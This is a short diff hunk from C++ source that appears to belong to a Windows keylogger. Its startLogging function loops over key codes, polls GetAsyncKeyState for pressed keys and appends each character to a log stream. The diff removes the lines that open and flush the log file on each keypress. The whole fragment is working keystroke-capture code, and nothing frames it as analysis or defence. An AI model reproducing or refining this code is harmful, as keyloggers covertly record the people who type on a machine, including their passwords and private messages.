@@ -34,9 +34,7 @@ void startLogging(){
     while(true){
         for (int i = 0x08; i <= 0xFE; i++){
             if (GetAsyncKeyState(i) & 0x8000) {
-                logg.open("log.txt", std::ios::app);
                 logg << char(i);
-                logg.flush();
                 Sleep(100);
             }
         }
